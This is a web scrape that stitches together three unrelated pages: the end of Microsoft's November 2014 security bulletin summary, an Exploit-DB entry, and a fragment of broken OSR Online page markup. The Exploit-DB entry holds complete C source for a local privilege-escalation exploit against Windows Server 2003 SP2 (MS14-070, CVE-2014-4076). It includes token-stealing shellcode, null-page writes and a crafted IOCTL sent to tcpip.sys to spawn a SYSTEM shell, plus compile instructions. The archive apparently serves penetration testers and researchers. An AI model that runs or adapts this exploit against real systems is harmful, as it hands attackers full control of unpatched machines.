| **Aggregate Severity Rating** | [**Important**](https://go.microsoft.com/fwlink/?linkid=21140) | [**Moderate**](https://go.microsoft.com/fwlink/?linkid=21140) |
| Microsoft Office 2007 Service Pack 3 | Microsoft Word 2007 Service Pack 3 (2899527) (Important) | Microsoft Office 2007 IME (Japanese) (2889913) (Moderate) |
| **Other Microsoft Office Software** |  |  |
| **Bulletin Identifier** | [**MS14-069**](https://go.microsoft.com/fwlink/?linkid=518105) | [**MS14-078**](https://go.microsoft.com/fwlink/?linkid=509952) |
| **Aggregate Severity Rating** | [**Important**](https://go.microsoft.com/fwlink/?linkid=21140) | **None** |
| Microsoft Word Viewer | Microsoft Word Viewer (2899553) (Important) | Not applicable |
| Microsoft Office Compatibility Pack Service Pack 3 | Microsoft Office Compatibility Pack Service Pack 3 (2899526) (Important) | Not applicable |

**Note for MS14-078**

This bulletin spans more than one software category. See the other tables in this section for additional affected software.

### Microsoft Server Software

| **Microsoft SharePoint Server 2010** |  |
| --- | --- |
| **Bulletin Identifier** | [**MS14-073**](https://go.microsoft.com/fwlink/?linkid=513105) |
| **Aggregate Severity Rating** | [**Important**](https://go.microsoft.com/fwlink/?linkid=21140) |
| Microsoft SharePoint Server 2010 Service Pack 2 | Microsoft SharePoint Foundation 2010 Service Pack 2 (2889838) (Important) |

## Detection and Deployment Tools and Guidance

Several resources are available to help administrators deploy security updates.

Microsoft Baseline Security Analyzer (MBSA) lets administrators scan local and remote systems for missing security updates and common security misconfigurations.

Windows Server Update Services (WSUS), Systems Management Server (SMS), and System Center Configuration Manager help administrators distribute security updates.

The Update Compatibility Evaluator components included with Application Compatibility Toolkit aid in streamlining the testing and validation of Windows updates against installed applications.

For information about these and other tools that are available, see [Security Tools for IT Pros](https://technet.microsoft.com/security/cc297183).

## Acknowledgments

Microsoft recognizes the efforts of those in the security community who help us protect customers through responsible vulnerability disclosure. See [Acknowledgments](https://technet.microsoft.com/library/security/dn820091.aspx) for more information.

## Other Information

### Microsoft Windows Malicious Software Removal Tool

For the bulletin release that occurs on the second Tuesday of each month, Microsoft has released an updated version of the Microsoft Windows Malicious Software Removal Tool on Windows Update, Microsoft Update, Windows Server Update Services, and the Download Center. No updated version of the Microsoft Windows Malicious Software Removal Tool is available for out-of-band security bulletin releases.

### Non-Security Updates on MU, WU, and WSUS

For information about non-security releases on Windows Update and Microsoft Update, please see:

* [Microsoft Knowledge Base Article 894199](https://support.microsoft.com/kb/894199): Description of Software Update Services and Windows Server Update Services changes in content. Includes all Windows content.
* [Updates from Past Months for Windows Server Update Services](https://technet.microsoft.com/wsus/bb456965). Displays all new, revised, and rereleased updates for Microsoft products other than Microsoft Windows.

### Microsoft Active Protections Program (MAPP)

To improve security protections for customers, Microsoft provides vulnerability information to major security software providers in advance of each monthly security update release. Security software providers can then use this vulnerability information to provide updated protections to customers via their security software or devices, such as antivirus, network-based intrusion detection systems, or host-based intrusion prevention systems. To determine whether active protections are available from security software providers, please visit the active protections websites provided by program partners listed in [Microsoft Active Protections Program (MAPP) Partners](https://go.microsoft.com/fwlink/?linkid=215201).

### Security Strategies and Community

**Update Management Strategies**

[Security Guidance for Update Management](https://go.microsoft.com/fwlink/?linkid=21168) provides additional information about Microsoftâs best-practice recommendations for applying security updates.

**Obtaining Other Security Updates**

Updates for other security issues are available from the following locations:

* Security updates are available from [Microsoft Download Center](https://go.microsoft.com/fwlink/?linkid=21129). You can find them most easily by doing a keyword search for "security update".
* Updates for consumer platforms are available from [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747).
* You can obtain the security updates offered this month on Windows Update, from Download Center on Security and Critical Releases ISO CD Image files. For more information, see [Microsoft Knowledge Base Article 913086](https://support.microsoft.com/kb/913086).

**IT Pro Security Community**

Learn to improve security and optimize your IT infrastructure, and participate with other IT Pros on security topics in [IT Pro Security Community](https://go.microsoft.com/fwlink/?linkid=21164).

### Support

The affected software listed has been tested to determine which versions are affected. Other versions are past their support life cycle. To determine the support life cycle for your software version, visit [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

Security solutions for IT professionals: [TechNet Security Troubleshooting and Support](https://technet.microsoft.com/security/bb980617)

Help protect your computer that is running Windows from viruses and malware: [Virus Solution and Security Center](https://support.microsoft.com/contactus/cu_sc_virsec_master)

Local support according to your country: [International Support](https://support.microsoft.com/common/international.aspx)

### Disclaimer

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

### Revisions

* V1.0 (November 11, 2014): Bulletin Summary published.
* V2.0 (November 18, 2014): Bulletin Summary revised to document the out-of-band release of MS14-068 and, for MS14-066, to announce the reoffering of the 2992611 update to systems running Windows Server 2008 R2 and Windows Server 2012.
* V2.1 (December 19, 2014): Bulletin Summary revised to include Windows 2012 Server Core installation and Windows 2012 R2 Server Core installation in the Affected Software table for MS14-076.

*Page generated 2014-12-19 13:20Z-08:00.*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from www.exploit-db.com_2cfcc535_20250124_121443.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Microsoft Windows Server 2003 SP2 - TCP/IP IOCTL Privilege Escalation (MS14-070)

#### EDB-ID:

###### 37755

#### CVE:

###### [2014-4076](https://nvd.nist.gov/vuln/detail/CVE-2014-4076)

---

**EDB Verified:**

#### Author:

###### [Tomislav Paskalev](/?author=7919)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2015-08-12

---

**Vulnerable App:**

```
/*
################################################################
# Exploit Title: Windows 2k3 SP2 TCP/IP IOCTL Privilege Escalation (MS14-070)
# Date: 2015-08-10
# Exploit Author: Tomislav Paskalev
# Vulnerable Software:
#   Windows 2003 SP2 x86
#   Windows 2003 SP2 x86-64
#   Windows 2003 SP2 IA-64
# Supported vulnerable software:
#   Windows 2003 SP2 x86
# Tested on:
#   Windows 2003 SP2 x86 EN
# CVE ID:   2014-4076
# OSVDB-ID: 114532
################################################################
# Vulnerability description:
#   Windows TCP/IP stack (tcpip.sys, tcpip6.sys) fails to
#   properly handle objects in memory during IOCTL processing.
#   By crafting an input buffer that will be passed to the TCP
#   device through the DeviceIoControlFile() function, it is
#   possible to trigger a vulnerability that would allow an
#   attacker to elevate privileges.
#   An attacker who successfully exploited this vulnerability
#   could run arbitrary code in kernel mode (i.e. with SYSTEM
#   privileges).
################################################################
# Exploit notes:
#   Privileged shell execution:
#     - the SYSTEM shell will spawn within the existing shell
#       (i.e. exploit usable via a remote shell)
#       - upon exiting the SYSTEM shell, the parent process
#         will become unresponsive/hang
#   Exploit compiling:
#     - # i586-mingw32msvc-gcc MS14-070.c -o MS14-070.exe
#   Exploit prerequisites:
#     - low privilege access to the target (remote shell or RDP)
#     - target not patched (KB2989935 not installed)
################################################################
# Patch:
#   https://www.microsoft.com/en-us/download/details.aspx?id=44646
################################################################
# Thanks to:
#   KoreLogic (Python PoC)
#   ChiChou (C++ PoC)
################################################################
# References:
#   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4076
#   https://technet.microsoft.com/library/security/ms14-070
#   https://www.exploit-db.com/exploits/35936/
#   https://github.com/ChiChou/CVE-2014-4076/blob/master/CVE-2014-4076/CVE-2014-4076.cpp
#   https://www.osronline.com/article.cfm?article=229
################################################################
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemBasicInformation                = 0,
        SystemPerformanceInformation          = 2,
        SystemTimeOfDayInformation            = 3,
        SystemProcessInformation              = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemInterruptInformation            = 23,
        SystemExceptionInformation            = 33,
        SystemRegistryQuotaInformation        = 37,
        SystemLookasideInformation            = 45
} SYSTEM_INFORMATION_CLASS;

typedef DWORD NTSTATUS;
NTSTATUS WINAPI NtQuerySystemInformation (
        SYSTEM_INFORMATION_CLASS   SystemInformationClass,
        PVOID                      SystemInformation,
        ULONG                      SystemInformationLength,
        PULONG                     ReturnLength
);

typedef struct _IO_STATUS_BLOCK {
        union {
                NTSTATUS           Status;
                PVOID              Pointer;
        };
        ULONG_PTR                  Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef void (WINAPI * PIO_APC_ROUTINE) (PVOID, PIO_STATUS_BLOCK, ULONG);

NTSTATUS (WINAPI *ZwAllocateVirtualMemory) (
        HANDLE                     ProcessHandle,
        PVOID                      *BaseAddress,
        ULONG_PTR                  ZeroBits,
        PSIZE_T                    RegionSize,
        ULONG                      AllocationType,
        ULONG                      Protect
);

NTSTATUS (WINAPI *ZwDeviceIoControlFile) (
        HANDLE                     FileHandle,
        PVOID                      ApcContext,
        PIO_STATUS_BLOCK           IoStatusBlock,
        ULONG                      IoControlCode,
        PVOID                      InputBuffer,
        ULONG                      InputBufferLength,
        PVOID                      OutputBuffer,
        ULONG                      OutputBufferLength
);

BOOL WINAPI CreateNewCmdProcess (STARTUPINFO *startupInformation, PROCESS_INFORMATION *processInformation)
{
        ZeroMemory (&startupInformation[0], sizeof (STARTUPINFO));
        startupInformation->cb = sizeof (STARTUPINFO);
        ZeroMemory (&processInformation[0], sizeof (PROCESS_INFORMATION));

        // Start the child process.
        return CreateProcess (
                NULL,                                                           // No module name (use command line)
                "c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32",   // Start cmd.exe
                NULL,                                                           // Process handle not inheritable
                NULL,                                                           // Thread handle not inheritable
                TRUE,                                                           // Set handle inheritance to TRUE
                0,                                                              // No creation flags
                NULL,                                                           // Use parent's environment block
                NULL,                                                           // Use parent's starting directory
                &startupInformation[0],                                         // Pointer to STARTUPINFO structure
                &processInformation[0]                                          // Pointer to PROCESS_INFORMATION structure
        );
}

unsigned long SwapBytes (unsigned long inputByteUL)
{
        return (((inputByteUL&0x000000FF) << 24) + ((inputByteUL&0x0000FF00) << 8) +
        ((inputByteUL&0x00FF0000) >> 8) + ((inputByteUL&0xFF000000) >> 24));
}

BOOL WriteToAllocMem (unsigned char *exploitBuffer, unsigned char *shellcode)
{
        int returnAllocMemValue1, returnAllocMemValue2, returnAllocMemValue3, returnAllocMemValue4, returnAllocMemValue5;

        returnAllocMemValue1 = WriteProcessMemory (
                (HANDLE) 0xFFFFFFFF,
                (LPVOID) 0x28,
                "\x87\xff\xff\x38",
                4,
                NULL
        );
        returnAllocMemValue2 = WriteProcessMemory (
                (HANDLE) 0xFFFFFFFF,
                (LPVOID) 0x38,
                "\x00\x00",
                2,
                NULL
        );
        returnAllocMemValue3 = WriteProcessMemory (
                (HANDLE) 0xFFFFFFFF,
                (LPVOID) 0x1100,
                &exploitBuffer[0],
                32,
                NULL
        );
        returnAllocMemValue4 = WriteProcessMemory (
                (HANDLE) 0xFFFFFFFF,
                (LPVOID) 0x2b,
                "\x00\x00",
                2,
                NULL
        );
        returnAllocMemValue5 = WriteProcessMemory (
                (HANDLE) 0xFFFFFFFF,
                (LPVOID) 0x2000,
                &shellcode[0],
                96,
                NULL
        );

        if (returnAllocMemValue1 == 0 ||
        returnAllocMemValue2 == 0 ||
        returnAllocMemValue3 == 0 ||
        returnAllocMemValue4 == 0 ||
        returnAllocMemValue5 == 0)
                return FALSE;
        else
                return TRUE;
}

int main (void)
{
        fprintf (stderr, "[*] MS14-070 (CVE-2014-4076) x86\n");
        fprintf (stderr, "    [*] by Tomislav Paskalev\n");
        fflush (stderr);

        ////////////////////////////////
        // CREATE NEW CME.EXE PROCESS
        ////////////////////////////////

        STARTUPINFO *startupInformation = (STARTUPINFO *) malloc (sizeof (STARTUPINFO));
        PROCESS_INFORMATION *processInformation = (PROCESS_INFORMATION *) malloc (sizeof (PROCESS_INFORMATION));

        if (!CreateNewCmdProcess (&startupInformation[0], &processInformation[0]))
        {
                fprintf (stderr, "[-] Creating a new process failed\n");
                fprintf (stderr, "    [*] Error code   : %d\n", GetLastError());
                fflush (stderr);
                ExitProcess (1);
        }

        fprintf (stderr, "[+] Created a new cmd.exe process\n");
        fflush (stderr);

        ////////////////////////////////
        // CONVERT PID TO HEX LE
        ////////////////////////////////

        unsigned long pidLittleEndian = SwapBytes ((unsigned long) processInformation->dwProcessId);
        fprintf (stderr, "    [*] PID [dec]    :   %#8lu\n", (unsigned long) processInformation->dwProcessId);
        fprintf (stderr, "    [*] PID [hex]    : %#010x\n", (unsigned long) processInformation->dwProcessId);
        fprintf (stderr, "    [*] PID [hex LE] : %#010x\n", pidLittleEndian);

        /*four bytes of hex = 8 characters, plus NULL terminator*/
        unsigned char pidLittleEndianString[9];

        sprintf (&pidLittleEndianString[0], "%04x", pidLittleEndian);

        ////////////////////////////////
        // CREATE SHELLCODE
        ////////////////////////////////

        unsigned char exploitBuffer[] =
        "\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00"
        "\x22\x00\x00\x00\x04\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00";
        unsigned char shellcode[] =
        "\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x38\x50\xBB\x04\x00\x00\x00"
        "\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00"
        "\x00\x75\xED\x8B\xB8\xD8\x00\x00\x00\x83\xE7\xF8\x58\xBB\x41\x41"
        "\x41\x41\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94"
        "\x00\x00\x00\x75\xED\x89\xB8\xD8\x00\x00\x00\x61\xBA\x11\x11\x11"
        "\x11\xB9\x22\x22\x22\x22\xB8\x3B\x00\x00\x00\x8E\xE0\x0F\x35\x00";

        int counter;
        for (counter = 0; counter < 4; counter++)
        {
                char buffer[3] = {pidLittleEndianString[counter * 2], pidLittleEndianString[(counter * 2) + 1], 0};
                shellcode[46 + counter] = strtol (buffer, NULL, 16);
        }

        shellcode[77] = strtol ("39", NULL, 16);
        shellcode[78] = strtol ("ff", NULL, 16);
        shellcode[79] = strtol ("a2", NULL, 16);
        shellcode[80] = strtol ("ba", NULL, 16);

        shellcode[82] = strtol ("0", NULL, 16);
        shellcode[83] = strtol ("0", NULL, 16);
        shellcode[84] = strtol ("0", NULL, 16);
        shellcode[85] = strtol ("0", NULL, 16);

        fprintf (stderr, "[+] Modified shellcode\n");
        fflush (stderr);

        ////////////////////////////////
        // CREATE HANDLE ON TCPIP.SYS
        ////////////////////////////////

        HANDLE tcpIPDeviceHandle = CreateFileA (
                "\\\\.\\Tcp",
                0,
                0,
                NULL,
                OPEN_EXISTING,
                0,
                NULL
        );

        if (tcpIPDeviceHandle == INVALID_HANDLE_VALUE)
        {
                printf ("[-] Opening TCP/IP I/O dev failed\n");
                printf ("    [*] Error code   : %d\n", GetLastError());
                ExitProcess (1);
        }

        fprintf (stderr, "[+] Opened TCP/IP I/O device\n");
        fflush (stderr);

        ////////////////////////////////
        // ALLOCATE MEMORY - FIRST PAGE
        ////////////////////////////////

        FARPROC ZwAllocateVirtualMemory;

        ZwAllocateVirtualMemory = GetProcAddress (GetModuleHandle ("NTDLL.DLL"), "ZwAllocateVirtualMemory");

        fprintf (stderr, "[*] ntdll.dll address: 0x%p\n", ZwAllocateVirtualMemory);
        fflush (stderr);

        NTSTATUS AllocMemReturnCode;
        ULONG BaseAddress = 0x1000, RegionSize = 0x4000;

        AllocMemReturnCode = ZwAllocateVirtualMemory (
                (HANDLE) 0xFFFFFFFF,
                &BaseAddress,
                0,
                &RegionSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
        );

        if (AllocMemReturnCode != 0)
        {
                printf ("[-] Allocating memory failed\n");
                printf ("    [*] Error code   : %#X\n", AllocMemReturnCode);
                ExitProcess (1);
        }

        fprintf (stderr, "[+] Allocated memory\n");
        fprintf (stderr, "    [*] BaseAddress  : 0x%p\n", BaseAddress);
        fprintf (stderr, "    [*] RegionSize   : %#010x\n", RegionSize);
        fflush (stderr);

        ////////////////////////////////
        // WRITE EXPLOIT TO PROCESS MEM
        ////////////////////////////////

        fprintf (stderr, "[*] Writing exploit...\n");
        fflush (stderr);

        if (!WriteToAllocMem (&exploitBuffer[0], &shellcode[0]))
        {
                fprintf (stderr, "    [-] Failed to write to memory\n");
                fprintf (stderr, "        [*] Err code : %d\n", GetLastError ());
                fflush (stderr);
                ExitProcess (1);
        }
        else
        {
                fprintf (stderr, "    [+] done\n");
                fflush (stderr);
        }

        ////////////////////////////////
        // SEND EXPLOIT TO TCPIP.SYS
        ////////////////////////////////

        fprintf (stderr, "[*] Spawning SYSTEM shell...\n");
        fprintf (stderr, "    [*] Parent proc hangs on exit\n");
        fflush (stderr);

        FARPROC ZwDeviceIoControlFile;
        NTSTATUS DevIoCtrlReturnCode;
        ULONG ioStatus = 8;

        ZwDeviceIoControlFile = GetProcAddress (GetModuleHandle ("NTDLL.DLL"), "ZwDeviceIoControlFile");

        DevIoCtrlReturnCode = ZwDeviceIoControlFile (
                tcpIPDeviceHandle,
                NULL,
                NULL,
                NULL,
                (PIO_STATUS_BLOCK) &ioStatus,
                0x00120028,                                //Device: NETWORK (0x12)
                                                        //Function: 0xa
                                                        //Access: FILE_ANY_ACCESS
                                                        //Method: METHOD_BUFFERED
                (PVOID) 0x1100,                                //NULL,                //Test
                32,                                        //0,                //Test
                NULL,
                0
        );

        if (DevIoCtrlReturnCode != 0)
        {
                fprintf (stderr, "    [-] Exploit failed (->TCP/IP)\n");
                fprintf (stderr, "        [*] Err code : %d\n", GetLastError ());
                fflush (stderr);
                ExitProcess (1);
        }

        ////////////////////////////////
        // WAIT FOR CHILD PROCESS; EXIT
        ////////////////////////////////

        // Wait until child process exits.
        WaitForSingleObject (processInformation->hProcess, INFINITE);

        fprintf (stderr, "[*] Exiting SYSTEM shell...\n");
        fflush (stderr);

        // Close process and thread handles.
        CloseHandle (tcpIPDeviceHandle);
        CloseHandle (processInformation->hProcess);
        CloseHandle (processInformation->hThread);

        return 1;
}

```

**Tags:**

[![](/screenshots/idlt38000/ms14-070-thumb.jpg)](/screenshots/idlt38000/ms14-070.jpg)

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.osronline.com_07454215_20250126_010411.html ===


| | | [OSRLogo](index.cfm.htm) | | [OSRLogo](index.cfm.htm)[OSRLogo](index.cfm.htm)[OSRLogo](index.cfm.htm) | x | [OSR Custom Development Services](adClick.cfm%5Eid%3D21.htm) | | --- | --- | --- | | | --- | --- | --- | --- | --- | | | | OSRLogo | | x | | --- | | **Everything Windows Driver Development** | | | --- | --- | --- | --- | | | x | | x | | --- | | | x |  |  |  | | --- | --- | --- | --- | | [GoToHomePage](index.cfm.htm) | x[Loginx](login.cfm.htm) | | | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | | | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

